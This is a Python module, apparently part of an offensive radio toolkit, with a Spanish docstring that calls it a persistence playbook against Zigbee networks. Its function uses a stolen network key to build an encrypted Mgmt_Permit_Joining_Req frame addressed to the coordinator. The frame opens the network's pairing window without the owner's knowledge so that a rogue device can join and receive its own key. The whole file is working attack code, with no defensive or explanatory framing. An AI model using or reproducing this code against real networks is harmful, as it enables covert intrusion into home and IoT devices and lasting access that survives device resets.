"""Playbook 3 — persistencia: apertura remota de la red + dispositivo rogue.

Con la network key robada se inyecta un comando ZDO Mgmt_Permit_Joining_Req
(cluster 0x0036) dirigido al coordinador: la red abre su ventana de
emparejamiento sin que el dueño toque la app. Dentro de la ventana, un
dispositivo rogue se une y recibe su propio Transport Key legítimo →
persistencia que sobrevive al reseteo de dispositivos individuales.

Payload ZDO Mgmt_Permit_Joining_Req: tsn(1) | duration(1) | tc_significance(1)
APS: FC=0x00, dst_ep=0 (ZDO), cluster=0x0036, profile=0x0000, src_ep=0
"""

from __future__ import annotations

from skyrf.playbooks.crypto_zigbee import build_nonce, ccm_encrypt
from skyrf.playbooks.frames import (
    SEC_CTRL_NWK, aps_header, mac_header, nwk_aux_header, nwk_header,
)

ZDO_ENDPOINT = 0x00
ZDO_PROFILE = 0x0000
ZDO_CLUSTER_MGMT_PERMIT_JOIN = 0x0036
COORDINATOR_SHORT = 0x0000


def build_permit_join_frame(network_key: bytes, *,
                            tc_long_addr: int,
                            nwk_frame_counter: int,
                            dst_pan: int,
                            duration_s: int = 60,
                            zdo_tsn: int = 1,
                            seq_mac: int = 1,
                            seq_nwk: int = 1) -> bytes:
    """Frame ZDO cifrado que ordena al Trust Center abrir el emparejamiento."""
    zdo = bytes([zdo_tsn & 0xFF, duration_s & 0xFF, 0x01])  # tsn | duration | tc_sig
    aps = aps_header(ZDO_ENDPOINT, ZDO_CLUSTER_MGMT_PERMIT_JOIN, ZDO_PROFILE,
                     ZDO_ENDPOINT, seq_nwk & 0xFF)
    plain = aps + zdo

    aux = nwk_aux_header(nwk_frame_counter, tc_long_addr, SEC_CTRL_NWK)
    nonce = build_nonce(tc_long_addr, nwk_frame_counter, SEC_CTRL_NWK)
    encrypted = ccm_encrypt(network_key, nonce, plain, aux)

    return (mac_header(dst_pan, COORDINATOR_SHORT, COORDINATOR_SHORT, seq_mac)
            + nwk_header(COORDINATOR_SHORT, COORDINATOR_SHORT, seq_nwk, security=True)
            + aux + encrypted)
